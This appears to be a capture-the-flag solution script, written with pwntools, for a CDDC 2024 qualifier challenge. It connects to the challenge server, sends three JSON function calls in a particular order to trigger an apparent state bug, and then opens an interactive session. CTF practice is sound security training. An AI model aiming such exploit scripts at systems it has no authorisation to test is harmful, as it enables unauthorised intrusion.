from pwn import *

p = remote("cddc2024-qualifiers-nlb-231aa6753cb7a1e6.elb.ap-southeast-1.amazonaws.com", 19754)

p.recv()

p.sendline('{"callNum": 1, "args": ["test"]}')

p.recv()

p.sendline('{"callNum": 3, "args": []}')

p.recv()

p.sendline('{"callNum": 2, "args": []}')

p.interactive()